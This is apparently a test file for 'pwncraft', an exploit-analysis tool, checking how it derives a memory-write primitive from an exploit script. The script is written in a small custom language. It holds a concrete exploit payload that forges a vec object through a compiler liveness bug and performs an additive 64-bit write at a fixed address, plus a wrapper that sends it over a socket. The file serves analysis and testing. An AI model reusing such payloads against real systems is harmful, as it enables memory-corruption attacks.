from pwncraft.features.audit.embedded_compiler import EmbeddedCompilerPolicy
from pwncraft.features.audit.embedded_runtime import (
    EmbeddedFieldLayout,
    EmbeddedIndexedAddSemantics,
    EmbeddedObjectLayout,
    EmbeddedRuntimePolicy,
)
from pwncraft.features.audit.semantic_facts import analyze_exp_semantics


COMPILER_POLICY = EmbeddedCompilerPolicy(
    name="reviewed-loop-void-arg-scan-omission",
    skip_loop_void_call_arguments_in_liveness=True,
    codegen_preserves_call_arguments=True,
    slot_allocator="first_fit_nonoverlap",
)

RUNTIME_POLICY = EmbeddedRuntimePolicy(
    name="reviewed-vec-indexed-add-runtime",
    object_layouts=(
        EmbeddedObjectLayout(
            type_name="vec",
            size=16,
            fields=(
                EmbeddedFieldLayout("data", 0, 8, kind="pointer"),
                EmbeddedFieldLayout("size", 8, 8, kind="int", signed=True),
            ),
        ),
    ),
    indexed_add_operations=(
        EmbeddedIndexedAddSemantics(
            callee="scribble",
            object_type="vec",
            object_arg_index=0,
            index_arg_index=1,
            delta_arg_index=2,
            data_field="data",
            size_field="size",
            element_width=8,
        ),
    ),
)


def _wrapper(payload: str) -> str:
    return "PAYLOAD = " + repr(payload) + "\n" + "sock.sendall(PAYLOAD.encode())\n"


def _payload(*, forge_expr: str | None = None, scribble_index: str = "526339", scribble_delta: str = "-205200") -> str:
    forge_expr = forge_expr or r'"\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\x7f"'
    return f'''function one() : -> int {{
  return 1;
}}
function forge() : -> str {{
  return {forge_expr};
}}
function pwn(int round, vec forged_vec) : -> void {{
  if (round == 0) {{
    return;
  }};
  scribble(forged_vec, {scribble_index}, {scribble_delta});
  return;
}}
function main() : int round, int keep_marker, vec vec_slot, str forged_header -> int {{
  vec_slot := vec_new(0);
  round := 0;
  keep_vec(vec_slot);
  do {{
    pwn(round, vec_slot);
    forged_header := forge();
    keep_marker := one() + 1234;
    round := round + 1;
  }} while (round < 2);
  keep_str(forged_header);
  keep_int(keep_marker);
  return 0;
}}
'''


def _analyze(payload: str, runtime_policy: EmbeddedRuntimePolicy | None = RUNTIME_POLICY) -> dict:
    return analyze_exp_semantics(
        _wrapper(payload),
        embedded_compiler_policy=COMPILER_POLICY,
        embedded_runtime_policy=runtime_policy,
    )


def test_reviewed_layout_decodes_forged_vec_and_derives_additive_write() -> None:
    result = _analyze(_payload())
    runtime = result["embedded_runtime_semantics"][0]
    relation = runtime["relations"][0]
    interpretation = relation["field_interpretation"]
    fields = {item["name"]: item["value"] for item in interpretation["fields"]}

    assert interpretation["raw_length"] == 16
    assert fields == {"data": 0, "size": 0x7FFFFFFFFFFFFFFF}

    write = relation["indexed_additive_writes"][0]
    assert write["index"] == 526339
    assert write["delta"] == -205200
    assert write["element_width"] == 8
    assert write["address"] == 0x404018
    assert write["width"] == 8
    assert write["bounds_proven"] is True
    assert write["state"] == "derived_static"
    assert write["runtime_observed"] is False

    primitive = next(item for item in result["primitives"] if item["domain"] == "memory_write")
    assert primitive["name"] == "constrained additive 64-bit write"
    assert primitive["address"] == 0x404018
    assert primitive["delta"] == -205200
    assert all("arbitrary write" not in item for item in primitive["limitations"])


def test_no_runtime_policy_means_type_confusion_does_not_become_write() -> None:
    result = _analyze(_payload(), runtime_policy=None)
    assert result["embedded_execution_semantics"]
    assert result["embedded_runtime_semantics"] == []
    assert not any(item.get("domain") == "memory_write" for item in result["primitives"])


def test_runtime_policy_without_compiler_policy_cannot_bypass_type_confusion_proof() -> None:
    result = analyze_exp_semantics(
        _wrapper(_payload()),
        embedded_runtime_policy=RUNTIME_POLICY,
    )
    assert result["embedded_compiler_semantics"] == []
    assert result["embedded_execution_semantics"] == []
    assert result["embedded_runtime_semantics"] == []
    assert not any(item.get("domain") == "memory_write" for item in result["primitives"])


def test_wrong_forged_object_length_stays_uninterpreted() -> None:
    result = _analyze(_payload(forge_expr=r'"\x00\x00\x00\x00\x00\x00\x00\x00"'))
    runtime = result["embedded_runtime_semantics"][0]
    assert runtime["relations"] == []
    assert runtime["primitives"] == []


def test_unknown_delta_blocks_write_instead_of_guessing() -> None:
    result = _analyze(_payload(scribble_delta="opaque_delta"))
    runtime = result["embedded_runtime_semantics"][0]
    assert runtime["relations"][0]["field_interpretation"]["fields"]
    assert runtime["relations"][0]["indexed_additive_writes"] == []
    assert runtime["primitives"] == []


def test_out_of_bounds_index_blocks_write() -> None:
    result = _analyze(_payload(scribble_index="9223372036854775807"))
    runtime = result["embedded_runtime_semantics"][0]
    assert runtime["relations"][0]["indexed_additive_writes"] == []
    assert runtime["primitives"] == []


def test_first_iteration_early_return_does_not_block_second_iteration_write() -> None:
    result = _analyze(_payload())
    write = result["embedded_runtime_semantics"][0]["relations"][0]["indexed_additive_writes"][0]
    assert write["function"] == "pwn"
    assert write["callee"] == "scribble"
